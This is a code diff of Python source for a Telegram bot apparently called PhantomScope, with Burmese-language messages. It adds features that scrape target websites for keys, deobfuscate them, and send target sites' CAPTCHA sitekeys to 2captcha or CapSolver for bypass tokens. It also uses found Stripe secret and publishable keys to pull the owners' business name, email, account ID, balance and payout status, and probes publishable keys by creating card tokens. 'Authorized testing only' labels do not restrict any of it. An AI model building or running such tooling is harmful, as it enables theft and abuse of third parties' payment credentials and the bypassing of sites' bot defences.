-            ct   = item.get("content_type", "") or ""
-            body = item.get("response_body", "") or item.get("body", "") or ""
-            if ("javascript" in ct or item.get("url","").endswith(".js")) and body:
-                lbl = item.get("url","?").split("/")[-1][:40]
-                texts_for_deob[lbl] = body
-        texts_for_deob["[HTML]"] = result.get("html", "")
-        deob_findings = await asyncio.to_thread(_deobfuscate_layer, texts_for_deob)
-        high_deob = [f for f in deob_findings
-                     if f["in_secret_context"] and f["entropy"] >= 4.5]
-        if high_deob:
-            deob_lines = [f"🧩 *Deobfuscated Keys — `{escape_md(domain)}`*",
-                          "━━━━━━━━━━━━━━━━━━━━",
-                          f"🔴 High-risk decoded: `{len(high_deob)}`\n"]
-            for i, f in enumerate(high_deob[:8], 1):
-                deob_lines.append(f"*[{i}]* `{escape_md(f['method'])}` H=`{f['entropy']}`")
-                deob_lines.append(f"  ✅ `{escape_md(f['decoded'][:80])}`")
-                deob_lines.append(f"  📂 _{escape_md(f['source'])}_\n")
-            deob_lines.append("⚠️ _Authorized testing only_")
-            await update.effective_message.reply_text(
-                _truncate_safe_md("\n".join(deob_lines)), parse_mode='Markdown')
-    except Exception as deob_err:
-        logger.debug("paykeys deobfuscate layer error: %s", deob_err)
-
-
 # ══════════════════════════════════════════════════
 # 💳  /verifykeys — Payment Key Validator (Read-Only)
 # ══════════════════════════════════════════════════
@@ -14484,58 +14706,523 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
 _paykeys_verify_cache: dict = {}
 _PAYKEYS_CACHE_TTL = 600   # 10 minutes
 
+# ══════════════════════════════════════════════════
+# 🔑  /setapikey — Store 2captcha / CapSolver API keys
+# ══════════════════════════════════════════════════
+
+# Sitekey verify result cache {uid: {"findings": [...], "domain": str, "ts": float}}
+_sitekey_verify_cache: dict = {}
+_SITEKEY_CACHE_TTL = 600  # 10 minutes
+
+
+async def cmd_setapikey(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/setapikey <service> <apikey> — Store 2captcha or CapSolver API key"""
+    uid = update.effective_user.id
+
+    if not context.args or len(context.args) < 2:
+        await update.effective_message.reply_text(
+            "🔑 *API Key Setup*\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "*Usage:*\n"
+            "  `/setapikey 2captcha YOUR_KEY`\n"
+            "  `/setapikey capsolver YOUR_KEY`\n\n"
+            "*Services:*\n"
+            "  🔵 `2captcha` — 2captcha.com\n"
+            "  🟢 `capsolver` — capsolver.com\n\n"
+            "_Key ကို DB ထဲ သိမ်းသည် — private chat မှသာ သုံးပါ_",
+            parse_mode="Markdown"
+        )
+        return
+
+    service = context.args[0].lower().strip()
+    apikey  = context.args[1].strip()
+
+    if service not in ("2captcha", "capsolver"):
+        await update.effective_message.reply_text(
+            "❌ Service `2captcha` သို့မဟုတ် `capsolver` သာ ခွင့်ပြုသည်",
+            parse_mode="Markdown"
+        )
+        return
+
+    if len(apikey) < 20:
+        await update.effective_message.reply_text(
+            "❌ API key တို လွန်းသည် — စစ်ဆေးပြီး ထပ်ထည့်ပါ",
+            parse_mode="Markdown"
+        )
+        return
+
+    db = await db_read()
+    db.setdefault("users", {}).setdefault(str(uid), {}).setdefault("api_keys", {})[service] = apikey
+    await db_write(db)
+
+    masked = apikey[:6] + "..." + apikey[-4:]
+    await update.effective_message.reply_text(
+        f"✅ *{service}* API key သိမ်းပြီး\n"
+        f"🔑 `{masked}`\n\n"
+        f"_/sitekey scan ပြီး verify button နှိပ်ပြီး သုံးနိုင်ပါပြီ_",
+        parse_mode="Markdown"
+    )
+
+
+async def _get_user_apikey(uid: int, service: str) -> str:
+    """Retrieve stored API key for a service from DB."""
+    db = await db_read()
+    return db.get("users", {}).get(str(uid), {}).get("api_keys", {}).get(service, "")
+
+
+def _2captcha_solve_sync(apikey: str, captcha_type: str, sitekey: str, pageurl: str,
+                          action: str = "", enterprise: int = 0,
+                          min_score: float = 0.0, invisible: int = 0,
+                          data_s: str = "") -> dict:
+    """Submit captcha to 2captcha and poll for result."""
+    base = "https://2captcha.com"
+    ct = captcha_type.lower()
+
+    if "turnstile" in ct:
+        method = "turnstile"
+    elif "hcaptcha" in ct:
+        method = "hcaptcha"
+    else:
+        method = "userrecaptcha"
+
+    payload: dict = {
+        "key":       apikey,
+        "method":    method,
+        "googlekey": sitekey,
+        "pageurl":   pageurl,
+        "json":      1,
+    }
+    if "hcaptcha" in ct:
+        payload["method"]  = "hcaptcha"
+        payload["sitekey"] = sitekey
+        del payload["googlekey"]
+    if "turnstile" in ct:
+        payload["method"]  = "turnstile"
+        payload["sitekey"] = sitekey
+        if "googlekey" in payload:
+            del payload["googlekey"]
+    if "v3" in ct or action:
+        payload["version"] = "v3"
+        if action:
+            payload["action"] = action
+        if min_score:
+            payload["min_score"] = min_score
+    if enterprise:
+        payload["enterprise"] = 1
+    if invisible:
+        payload["invisible"] = 1
+    if data_s:
+        payload["data-s"] = data_s
+
+    try:
+        r    = requests.post(f"{base}/in.php", data=payload, timeout=20)
+        resp = r.json()
+        if resp.get("status") != 1:
+            return {"token": "", "cost": "", "error": f"Submit: {resp.get('request','unknown')}"}
+        task_id = resp["request"]
+    except Exception as e:
+        return {"token": "", "cost": "", "error": f"Submit exception: {e}"}
+
+    for _ in range(24):
+        time.sleep(5)
+        try:
+            pr   = requests.get(f"{base}/res.php",
+                                params={"key": apikey, "action": "get",
+                                        "id": task_id, "json": 1}, timeout=15)
+            prj  = pr.json()
+            if prj.get("status") == 1:
+                return {"token": prj.get("request", ""), "cost": prj.get("price", ""), "error": None}
+            if prj.get("request") not in ("CAPCHA_NOT_READY", "CAPTCHA_NOT_READY"):
+                return {"token": "", "cost": "", "error": prj.get("request", "Poll error")}
+        except Exception as e:
+            return {"token": "", "cost": "", "error": f"Poll exception: {e}"}
+
+    return {"token": "", "cost": "", "error": "Timeout (120s)"}
+
+
+def _capsolver_solve_sync(apikey: str, captcha_type: str, sitekey: str, pageurl: str,
+                           action: str = "", enterprise: int = 0,
+                           min_score: float = 0.0, invisible: int = 0) -> dict:
+    """Submit captcha to CapSolver and poll for result."""
+    base = "https://api.capsolver.com"
+    ct   = captcha_type.lower()
+
+    if "turnstile" in ct:
+        task_type = "AntiTurnstileTaskProxyLess"
+    elif "hcaptcha" in ct:
+        task_type = "HCaptchaTaskProxyLess"
+    elif "enterprise" in ct or enterprise:
+        task_type = "ReCaptchaV2EnterpriseTaskProxyLess"
+    elif "v3" in ct:
+        task_type = "ReCaptchaV3TaskProxyLess"
+    else:
+        task_type = "ReCaptchaV2TaskProxyLess"
+
+    task: dict = {"type": task_type, "websiteURL": pageurl, "websiteKey": sitekey}
+    if "v3" in ct or action:
+        task["pageAction"] = action or "submit"
+        if min_score:
+            task["minScore"] = min_score
+    if invisible:
+        task["isInvisible"] = True
+
+    try:
+        r  = requests.post(f"{base}/createTask",
+                           json={"clientKey": apikey, "task": task}, timeout=20)
+        rj = r.json()
+        if rj.get("errorId") != 0:
+            return {"token": "", "cost": "", "error": rj.get("errorDescription", "Submit error")}
+        task_id = rj["taskId"]
+    except Exception as e:
+        return {"token": "", "cost": "", "error": f"Submit exception: {e}"}
+
+    for _ in range(24):
+        time.sleep(5)
+        try:
+            pr  = requests.post(f"{base}/getTaskResult",
+                                json={"clientKey": apikey, "taskId": task_id}, timeout=15)
+            prj = pr.json()
+            if prj.get("errorId") != 0:
+                return {"token": "", "cost": "", "error": prj.get("errorDescription", "Poll error")}
+            if prj.get("status") == "ready":
+                sol   = prj.get("solution", {})
+                token = sol.get("gRecaptchaResponse") or sol.get("token") or ""
+                return {"token": token, "cost": "", "error": None}
+        except Exception as e:
+            return {"token": "", "cost": "", "error": f"Poll exception: {e}"}
+
+    return {"token": "", "cost": "", "error": "Timeout (120s)"}
+
+
+async def sitekey_verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Inline verify buttons from /sitekey.
+    Pattern: sv_<service>_<uid>_<idx>
+    """
+    query = update.callback_query
+    try:
+        await query.answer("⏳ Solving... (max 120s)")
+    except Exception:
+        pass
+
+    data = query.data
+    try:
+        parts   = data.split("_")
+        service = parts[1]
+        uid     = int(parts[2])
+        idx     = int(parts[3])
+    except Exception:
+        await query.answer("❌ Invalid data", show_alert=True)
+        return
+
+    if query.from_user.id != uid:
+        await query.answer("🚫 သင်မဟုတ်ပါ", show_alert=True)
+        return
+
+    cached = _sitekey_verify_cache.get(uid)
+    if not cached or (time.time() - cached.get("ts", 0)) > _SITEKEY_CACHE_TTL:
+        await query.answer("⚠️ Cache expired — /sitekey ထပ်လုပ်ပါ", show_alert=True)
+        return
+
+    findings = cached.get("findings", [])
+    if idx >= len(findings):
+        await query.answer("⚠️ Index error", show_alert=True)
+        return
+
+    f          = findings[idx]
+    sk         = f.get("site_key") or f.get("value") or ""
+    pageurl    = f.get("page_url") or cached.get("domain", "")
+    cap_type   = f.get("type", "")
+    action     = f.get("action", "")
+    enterprise = 1 if f.get("enterprise") else 0
+    min_score  = float(f["min_score"]) if f.get("min_score") else 0.0
+    invisible  = 1 if f.get("invisible") else 0
+    data_s     = f.get("s_param", "")
+
+    if not sk or not pageurl:
+        await query.answer("❌ sitekey / pageurl မရှိပါ", show_alert=True)
+        return
+
+    apikey = await _get_user_apikey(uid, service)
+    if not apikey:
+        await query.answer(
+            f"❌ {service} API key မရှိပါ — /setapikey {service} YOUR_KEY",
+            show_alert=True
+        )
+        return
+
+    svc_icon = "🔵" if service == "2captcha" else "🟢"
+    prog_msg = await context.bot.send_message(
+        chat_id=query.from_user.id,
+        text=(
+            f"{svc_icon} *{service} Verify*\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔑 `{sk[:30]}...`\n"
+            f"🌐 `{pageurl[:60]}`\n"
+            f"⏳ Polling... (max 120s)"
+        ),
+        parse_mode="Markdown"
+    )
+
+    try:
+        if service == "2captcha":
+            result = await asyncio.to_thread(
+                _2captcha_solve_sync,
+                apikey, cap_type, sk, pageurl,
+                action, enterprise, min_score, invisible, data_s
+            )
+        else:
+            result = await asyncio.to_thread(
+                _capsolver_solve_sync,
+                apikey, cap_type, sk, pageurl,
+                action, enterprise, min_score, invisible
+            )
+    except Exception as e:
+        await prog_msg.edit_text(
+            f"❌ Exception: `{escape_md(str(e))}`", parse_mode="Markdown")
+        return
+
+    token = result.get("token", "")
+    error = result.get("error")
+    cost  = result.get("cost", "")
+
+    if error or not token:
+        await prog_msg.edit_text(
+            f"{svc_icon} *{service} — ❌ FAILED*\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔑 `{sk[:40]}`\n"
+            f"🌐 `{pageurl[:60]}`\n"
+            f"❌ `{escape_md(str(error or 'No token returned'))}`\n\n"
+            f"_Key မှားနေ သို့မဟုတ် site က block လုပ်နေသည်_",
+            parse_mode="Markdown"
+        )
+        return
+
+    token_preview = token[:80] + ("..." if len(token) > 80 else "")
+    sp_parts = [f'  "type":    "{cap_type}"',
+                f'  "sitekey": "{sk}"',
+                f'  "pageurl": "{pageurl}"']
+    if action:    sp_parts.append(f'  "action":  "{action}"')
+    if enterprise: sp_parts.append(f'  "enterprise": 1')
+    if min_score:  sp_parts.append(f'  "min_score": {min_score}')
+
+    await prog_msg.edit_text(
+        f"{svc_icon} *{service} — ✅ VERIFIED LIVE*\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🏷️ `{escape_md(cap_type)}`\n"
+        f"🔑 `{sk}`\n"
+        f"🌐 `{pageurl[:70]}`\n"
+        + (f"⚡ action: `{escape_md(action)}`\n" if action else "")
+        + (f"🏢 enterprise: `1`\n" if enterprise else "")
+        + (f"📊 min_score: `{min_score}`\n" if min_score else "")
+        + f"\n✅ *Token:*\n"
+        f"```\n{token_preview}\n```\n"
+        + (f"💰 Cost: `{cost}`\n" if cost else "")
+        + f"\n📌 *Solver Params:*\n"
+        f"```json\n{{\n"
+        + "\n".join(sp_parts)
+        + f"\n}}\n```\n"
+        f"⚠️ _Authorized testing only_",
+        parse_mode="Markdown"
+    )
+
 
 # ── Per-gateway verify functions ──────────────────────────────────────────
 
 def _verify_stripe(key: str) -> dict:
-    """Stripe sk_live_ / sk_test_ → GET /v1/balance (read-only)"""
+    """Stripe sk_live_ / sk_test_ → GET /v1/account + /v1/balance (read-only, full info)"""
     env_label = "🔴 LIVE" if key.startswith("sk_live_") else "🟡 TEST"
     masked    = key[:12] + "..." + key[-4:]
+    headers   = {"Authorization": f"Bearer {key}"}
+
+    account_info: dict = {}
+
+    # ── GET /v1/account — full info with sk_ ─────────────────────────────────
     try:
-        r = requests.get(
-            "https://api.stripe.com/v1/balance",
-            headers={"Authorization": f"Bearer {key}"},
-            timeout=12,
-        )
-        if r.status_code == 200:
-            data  = r.json()
-            avail = data.get("available", [])
-            bal   = ", ".join(
-                f"{b.get('currency','?').upper()} {b.get('amount',0)/100:.2f}"
-                for b in avail[:3]
-            ) or "—"
-            return {"gateway": "Stripe", "status": "✅ VALID", "env": env_label,
-                    "detail": f"Balance: {bal}", "key": masked}
-        elif r.status_code == 401:
-            err = r.json().get("error", {}).get("message", "Unauthorized")
+        ra = requests.get("https://api.stripe.com/v1/account",
+                          headers=headers, timeout=12)
+        if ra.status_code == 200:
+            account_info = ra.json()
+        elif ra.status_code == 401:
+            err = ra.json().get("error", {}).get("message", "Unauthorized")
             return {"gateway": "Stripe", "status": "❌ INVALID / REVOKED",
-                    "env": env_label, "detail": err[:80], "key": masked}
-        elif r.status_code == 403:
-            # Restricted key — still valid but no balance scope
-            return {"gateway": "Stripe", "status": "⚠️ VALID (Restricted)",
-                    "env": env_label, "detail": "Key valid but restricted scope", "key": masked}
-        else:
-            return {"gateway": "Stripe", "status": f"⚠️ HTTP {r.status_code}",
-                    "env": env_label, "detail": r.text[:80], "key": masked}
+                    "env": env_label, "detail": err[:80], "key": masked,
+                    "account_info": {}}
+        elif ra.status_code == 403:
+            return {"gateway": "Stripe", "status": "⚠️ VALID (Restricted scope)",
+                    "env": env_label,
+                    "detail": "Key valid but restricted — no account scope",
+                    "key": masked, "account_info": {}}
     except requests.exceptions.Timeout:
         return {"gateway": "Stripe", "status": "❌ Timeout", "env": env_label,
-                "detail": "API ကို 12s အတွင်း မရောက်ပါ", "key": masked}
+                "detail": "API ကို 12s အတွင်း မရောက်ပါ", "key": masked, "account_info": {}}
     except Exception as e:
         return {"gateway": "Stripe", "status": "❌ Error", "env": env_label,
-                "detail": str(e)[:60], "key": masked}
+                "detail": str(e)[:60], "key": masked, "account_info": {}}
+
+    # ── GET /v1/balance ───────────────────────────────────────────────────────
+    balance_str = ""
+    try:
+        rb   = requests.get("https://api.stripe.com/v1/balance",
+                            headers=headers, timeout=12)
+        if rb.status_code == 200:
+            avail = rb.json().get("available", [])
+            balance_str = ", ".join(
+                f"{b.get('currency','?').upper()} {b.get('amount',0)/100:.2f}"
+                for b in avail[:3]
+            )
+    except Exception:
+        pass
+
+    # ── Extract fields ────────────────────────────────────────────────────────
+    business_profile = account_info.get("business_profile") or {}
+    settings         = account_info.get("settings") or {}
+    dashboard        = settings.get("dashboard") or {}
+
+    country          = account_info.get("country", "")
+    default_currency = account_info.get("default_currency", "")
+    business_name    = (business_profile.get("name")
+                        or dashboard.get("display_name")
+                        or account_info.get("display_name", ""))
+    charges_enabled  = account_info.get("charges_enabled")
+    payouts_enabled  = account_info.get("payouts_enabled")
+    account_type     = account_info.get("type", "")
+    account_id       = account_info.get("id", "")
+    livemode         = account_info.get("livemode", key.startswith("sk_live_"))
+    email            = account_info.get("email", "")
+
+    detail_parts = []
+    if business_name:    detail_parts.append(f"🏢 {business_name}")
+    if country:          detail_parts.append(f"🌏 {country.upper()}")
+    if default_currency: detail_parts.append(f"💱 {default_currency.upper()}")
+    if account_type:     detail_parts.append(f"📋 {account_type}")
+    if balance_str:      detail_parts.append(f"💰 {balance_str}")
+    if charges_enabled is not None:
+        detail_parts.append("✅ charges" if charges_enabled else "❌ charges_off")
+    if payouts_enabled is not None:
+        detail_parts.append("✅ payouts" if payouts_enabled else "❌ payouts_off")
+
+    detail = " | ".join(detail_parts) or "Account info retrieved"
+
+    return {
+        "gateway":      "Stripe",
+        "status":       "✅ VALID (Secret Key)",
+        "env":          env_label,
+        "detail":       detail,
+        "key":          masked,
+        "account_info": {
+            "business_name":    business_name,
+            "country":          country,
+            "default_currency": default_currency,
+            "account_type":     account_type,
+            "charges_enabled":  charges_enabled,
+            "payouts_enabled":  payouts_enabled,
+            "livemode":         livemode,
+            "account_id":       account_id,
+            "email":            email,
+            "balance":          balance_str,
+        },
+    }
 
 
 def _verify_stripe_publishable(key: str) -> dict:
-    """Stripe pk_ key — publishable key is public, just classify it"""
+    """
+    Stripe pk_live_ / pk_test_ — fetch account public info.
+    GET /v1/account with pk_ returns limited but useful fields.
+    Falls back to token endpoint probe for livemode confirmation.
+    """
     env_label = "🔴 LIVE" if key.startswith("pk_live_") else "🟡 TEST"
     masked    = key[:12] + "..." + key[-4:]
-    # Publishable keys cannot authenticate API calls — just fingerprint
+    headers   = {"Authorization": f"Bearer {key}"}
+    account_info: dict = {}
+
+    # Try GET /v1/account
+    try:
+        r = requests.get("https://api.stripe.com/v1/account",
+                         headers=headers, timeout=12)
+        if r.status_code == 200:
+            account_info = r.json()
+        elif r.status_code == 401:
+            err = r.json().get("error", {}).get("message", "Unauthorized")
+            return {"gateway": "Stripe", "status": "❌ INVALID / REVOKED",
+                    "env": env_label, "detail": err[:80], "key": masked,
+                    "account_info": {}}
+    except Exception as e:
+        return {"gateway": "Stripe", "status": "❌ Error",
+                "env": env_label, "detail": str(e)[:60], "key": masked,
+                "account_info": {}}
+
+    # Probe via token endpoint if /v1/account returned nothing useful
+    if not account_info:
+        try:
+            probe = requests.post(
+                "https://api.stripe.com/v1/tokens",
+                headers=headers,
+                data={"card[number]": "4242424242424242",
+                      "card[exp_month]": "12",
+                      "card[exp_year]": "2030",
+                      "card[cvc]": "123"},
+                timeout=12,
+            )
+            pj = probe.json()
+            if probe.status_code == 200:
+                account_info["_probe_livemode"] = pj.get("livemode", False)
+                account_info["_probe_status"]   = "token_created"
+            elif probe.status_code in (400, 402):
+                account_info["_probe_livemode"] = key.startswith("pk_live_")
+                account_info["_probe_status"]   = "key_valid_card_error"
+        except Exception:
+            pass
+
+    # Extract fields
+    business_profile = account_info.get("business_profile") or {}
+    settings         = account_info.get("settings") or {}
+    dashboard        = settings.get("dashboard") or {}
+
+    country          = account_info.get("country", "")
+    default_currency = account_info.get("default_currency", "")
+    business_name    = (business_profile.get("name")
+                        or dashboard.get("display_name")
+                        or account_info.get("display_name", ""))
+    charges_enabled  = account_info.get("charges_enabled")
+    payouts_enabled  = account_info.get("payouts_enabled")
+    account_type     = account_info.get("type", "")
+    account_id       = account_info.get("id", "")
+    livemode         = account_info.get("_probe_livemode", key.startswith("pk_live_"))
+    email            = account_info.get("email", "")
+
+    detail_parts = []
+    if business_name:    detail_parts.append(f"🏢 {business_name}")
+    if country:          detail_parts.append(f"🌏 {country.upper()}")
+    if default_currency: detail_parts.append(f"💱 {default_currency.upper()}")
+    if account_type:     detail_parts.append(f"📋 {account_type}")
+    if charges_enabled is not None:
+        detail_parts.append("✅ charges_enabled" if charges_enabled else "❌ charges_disabled")
+    if payouts_enabled is not None:
+        detail_parts.append("✅ payouts_enabled" if payouts_enabled else "❌ payouts_disabled")
+    if email:            detail_parts.append(f"📧 {email}")
+    if account_id:       detail_parts.append(f"🆔 {account_id[:18]}")
+    detail_parts.append(f"📡 livemode: {livemode}")
+
+    detail = " | ".join(detail_parts) or "Public key — limited info"
+
     return {
-        "gateway": "Stripe",
-        "status":  "ℹ️ PUBLISHABLE KEY",
-        "env":     env_label,
-        "detail":  "Public key — frontend only, no secret access",
-        "key":     masked,
+        "gateway":      "Stripe",
+        "status":       "✅ VALID (Publishable Key)",
+        "env":          env_label,
+        "detail":       detail,
+        "key":          masked,
+        "account_info": {
+            "business_name":    business_name,
+            "country":          country,
+            "default_currency": default_currency,
+            "account_type":     account_type,
+            "charges_enabled":  charges_enabled,
+            "payouts_enabled":  payouts_enabled,
+            "livemode":         livemode,
+            "account_id":       account_id,
+            "email":            email,
+        },
     }
 
 
@@ -14716,7 +15403,7 @@ def _run_verify_all(findings: list[dict]) -> list[dict]:
 
 
 def _build_verify_report(results: list[dict], domain: str) -> str:
-    """Verify results ကို Telegram Markdown report အဖြစ် build လုပ်တယ်"""
+    """Verify results ကို Telegram Markdown report အဖြစ် build လုပ်တယ် — account info ပါဝင်"""
     valid   = [r for r in results if "✅" in r["status"]]
     warn    = [r for r in results if "⚠️" in r["status"]]
     invalid = [r for r in results if "❌" in r["status"]]
@@ -14729,13 +15416,41 @@ def _build_verify_report(results: list[dict], domain: str) -> str:
         f"❌ Invalid: `{len(invalid)}` | 🔴 Live: `{len(live)}`\n",
     ]
 
-    # Order: valid → warn → invalid
     ordered = valid + warn + invalid
     for i, r in enumerate(ordered, 1):
         lines.append(f"*[{i}]* {r['gateway']} — {r['status']}")
         lines.append(f"  🌐 `{r.get('env','?')}`")
         lines.append(f"  🔑 `{escape_md(r['key'])}`")
-        lines.append(f"  📋 _{escape_md(r.get('detail',''))}_\n")
+        lines.append(f"  📋 _{escape_md(r.get('detail',''))}_")
+
+        # ── Stripe account_info full block ────────────────────────────────────
+        ai = r.get("account_info") or {}
+        if ai and r.get("gateway") == "Stripe" and "✅" in r["status"]:
+            lines.append("")
+            lines.append("  📦 *Stripe Account Info:*")
+            if ai.get("business_name"):
+                lines.append(f"  🏢 Business: `{escape_md(ai['business_name'])}`")
+            if ai.get("country"):
+                lines.append(f"  🌏 Country: `{ai['country'].upper()}`")
+            if ai.get("default_currency"):
+                lines.append(f"  💱 Currency: `{ai['default_currency'].upper()}`")
+            if ai.get("account_type"):
+                lines.append(f"  📋 Type: `{escape_md(ai['account_type'])}`")
+            if ai.get("charges_enabled") is not None:
+                tag = "✅ Enabled" if ai["charges_enabled"] else "❌ Disabled"
+                lines.append(f"  💳 Charges: {tag}")
+            if ai.get("payouts_enabled") is not None:
+                tag = "✅ Enabled" if ai["payouts_enabled"] else "❌ Disabled"
+                lines.append(f"  💸 Payouts: {tag}")
+            if ai.get("email"):
+                lines.append(f"  📧 Email: `{escape_md(ai['email'])}`")
+            if ai.get("account_id"):
+                lines.append(f"  🆔 ID: `{escape_md(ai['account_id'][:24])}`")
+            lm = ai.get("livemode")
+            if lm is not None:
+                lines.append(f"  📡 Livemode: `{lm}`")
+
+        lines.append("")
 
     lines.append("━━━━━━━━━━━━━━━━━━")
     lines.append("🔒 _Read-only — No charge/transaction performed_")
@@ -15016,7 +15731,7 @@ async def cmd_socialkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_socialkeys_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _socialkeys_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel(); await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown'); return
     finally:
@@ -15185,7 +15900,7 @@ async def cmd_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_analytics_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _analytics_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel(); await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown'); return
     finally:
@@ -17091,7 +17806,7 @@ async def cmd_jwtlive(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_jwtlive_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _jwtlive_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel(); await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown'); return
     finally:
@@ -17266,7 +17981,7 @@ async def cmd_pushkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_pushkeys_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _pushkeys_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel(); await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown'); return
     finally:
@@ -17411,7 +18126,7 @@ async def cmd_chatkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_chatkeys_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _chatkeys_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel(); await msg.edit_text(f"❌ `{escape_md(e)}`", parse_mode='Markdown'); return
     finally:
@@ -17596,8 +18311,8 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     prog_task = asyncio.create_task(_prog_loop())
 
     try:
-        result = await asyncio.to_thread(
-            analyze_app_file, save_path, lambda t: prog_q.append(t)
+        result = await run_scan(
+            uid, analyze_app_file, save_path, lambda t: prog_q.append(t)
         )
     except Exception as e:
         prog_task.cancel()
@@ -18096,7 +18811,11 @@ async def _run_download(
             await update.effective_message.reply_text("🚫 Ban ထားပါတယ်"); return
         if not db["settings"]["bot_enabled"] and uid not in ADMIN_IDS:
             _save_db_sync(db)
-            await update.effective_message.reply_text("🔴 Bot ယာယီပိတ်ထားပါတယ်"); return
+            await update.effective_message.reply_text(
+                "🔴 *Bot ယာယီပိတ်ထားသည်*\nAdmin မှ maintenance လုပ်နေပါသည်",
+                parse_mode='Markdown'
+            )
+            return
         if not resume_mode and not can_download(db, u):
             lim = get_limit(db, u)
             _save_db_sync(db)
@@ -18241,25 +18960,67 @@ async def _run_download(
         await msg.edit_text(f"❌ Upload error: {type(e).__name__}")
 
 
-# ── Command wrappers ──────────────────────────────
+# ══════════════════════════════════════════════════
+# 🛑  GLOBAL STOP / TASK REGISTRY
+# ══════════════════════════════════════════════════
+
+def _register_task(uid: int, task: asyncio.Task) -> None:
+    """Register a running scan task for a user (enables /stop for all commands)."""
+    _user_tasks[uid] = task
+
+def _clear_task(uid: int) -> None:
+    _user_tasks.pop(uid, None)
+
+async def run_scan(uid: int, fn, *args, **kwargs):
+    """
+    Wrapper: run blocking fn(*args) in thread, registered so /stop can cancel it.
+    Also acquires _scan_semaphore (max 5 concurrent scans).
+    Usage:
+        result = await run_scan(uid, _my_sync_func, url, progress_cb)
+    """
+    async with _scan_semaphore:
+        task = asyncio.current_task()
+        _register_task(uid, task)
+        try:
+            return await asyncio.to_thread(fn, *args, **kwargs)
+        except asyncio.CancelledError:
+            raise
+        finally:
+            _clear_task(uid)
 
 async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/stop — Cancel current running download"""
-    uid = update.effective_user.id
+    """/stop — လက်ရှိ run နေသော command မည်သည့်အမျိုးအစားမဆို ရပ်ရန်"""
+    uid   = update.effective_user.id
+    msg   = update.effective_message
+    stopped = []
+
+    # 1. Download cancel flag
     event = _cancel_flags.get(uid)
     if event and not event.is_set():
         event.set()
-        await update.effective_message.reply_text(
-            "🛑 *Download cancel လုပ်နေပါတယ်...*\n"
-            "⚙️ လက်ရှိ page/asset ပြီးရင် ရပ်မယ်",
+        stopped.append("📥 Download")
+
+    # 2. Any active scan task
+    task = _user_tasks.get(uid)
+    if task and not task.done():
+        task.cancel()
+        _clear_task(uid)
+        stopped.append("🔍 Scan")
+
+    if stopped:
+        await msg.reply_text(
+            f"🛑 *Stopped:* {', '.join(stopped)}\n"
+            f"⚙️ လက်ရှိ operation ရပ်သွားပါပြီ",
             parse_mode='Markdown'
         )
     else:
-        await update.effective_message.reply_text(
-            "ℹ️ Cancel လုပ်စရာ Download မရှိပါ\n"
-            "`/download`, `/fullsite` စသည်ဖြင့် download ကနဦးစပါ",
+        await msg.reply_text(
+            "ℹ️ ရပ်ရမည့် operation မရှိပါ\n"
+            "Command တစ်ခုခု run နေမှ `/stop` သုံးပါ",
             parse_mode='Markdown'
         )
+
+# ── Command wrappers ──────────────────────────────
 
 
 async def cmd_download(u, c):
@@ -18306,42 +19067,67 @@ async def cmd_resume(u, c):
 # ══════════════════════════════════════════════════
 
 async def _send_admin_panel(target, db: dict):
-    bot_on    = db["settings"]["bot_enabled"]
-    today     = str(date.today())
-    tu        = len(db["users"])
-    tdl       = sum(u.get("total_downloads",0) for u in db["users"].values())
-    banned_n  = sum(1 for u in db["users"].values() if u.get("banned"))
-    today_dl  = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
+    bot_on      = db["settings"]["bot_enabled"]
+    today       = str(date.today())
+    tu          = len(db["users"])
+    tdl         = sum(u.get("total_downloads", 0) for u in db["users"].values())
+    banned_n    = sum(1 for u in db["users"].values() if u.get("banned"))
+    today_dl    = sum(u["count_today"] for u in db["users"].values() if u.get("last_date") == today)
+    active_scans = sum(1 for t in _user_tasks.values() if t and not t.done())
+    proxy_st    = proxy_manager.stats()
+    proxy_live  = proxy_st.get("live", 0)
+    proxy_total = proxy_st.get("total", 0)
+    limit       = db["settings"]["global_daily_limit"]
+
+    bot_icon  = "🟢" if bot_on  else "🔴"
+    bot_label = "ON"  if bot_on else "OFF"
+    pw_icon   = "✅"  if PLAYWRIGHT_OK else "❌"
+
+    text = (
+        f"👑 *PhantomScope Admin Panel*\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"{bot_icon} Bot: *{bot_label}* | 🕸️ JS Engine: {pw_icon}\n"
